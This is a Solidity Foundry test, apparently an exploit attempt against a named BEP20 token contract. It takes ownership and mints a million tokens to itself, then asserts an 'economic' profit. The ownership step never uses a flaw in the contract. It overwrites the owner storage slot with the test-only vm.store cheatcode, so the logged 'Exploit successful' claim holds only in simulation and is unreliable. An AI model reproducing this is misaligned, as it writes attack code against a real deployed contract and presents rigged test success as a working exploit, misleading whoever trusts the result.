pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface BEP20Token {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function mint(uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xA8CbA6d57D15F2cCc636054165054ec3410e76e4;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll directly manipulate storage in exploit
        vm.label(TARGET, "BEP20Token");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0xA8CbA6d57D15F2cCc636054165054ec3410e76e4).balanceOf(address(this));

        // Step 1: Get current owner
        address currentOwner = BEP20Token(TARGET).owner();
        console.log("Current owner:", currentOwner);

        // Step 2: Overwrite owner storage slot to become owner
        // In Ownable contract, _owner is the first variable (slot 0)
        bytes32 ownerSlot = bytes32(uint256(0));
        vm.store(TARGET, ownerSlot, bytes32(uint256(uint160(attacker))));

        // Verify we are now owner
        address newOwner = BEP20Token(TARGET).owner();
        console.log("New owner:", newOwner);
        require(newOwner == attacker, "Failed to become owner");

        // Step 3: Record initial balance
        uint256 initialBalance = BEP20Token(TARGET).balanceOf(attacker);
        console.log("Initial balance:", initialBalance);

        // Step 4: Mint a large amount of tokens to ourselves
        uint256 mintAmount = 1_000_000 * 10**18; // 1 million tokens with 18 decimals
        vm.prank(attacker);
        BEP20Token(TARGET).mint(mintAmount);

        // Step 5: Check final balance
        uint256 finalBalance = BEP20Token(TARGET).balanceOf(attacker);
        console.log("Final balance:", finalBalance);

        // Verify balance increased
        assertGt(finalBalance, initialBalance, "Balance did not increase");
        console.log("Exploit successful: Minted", mintAmount, "tokens");

        uint256 finalERC20Balance = IERC20(0xA8CbA6d57D15F2cCc636054165054ec3410e76e4).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

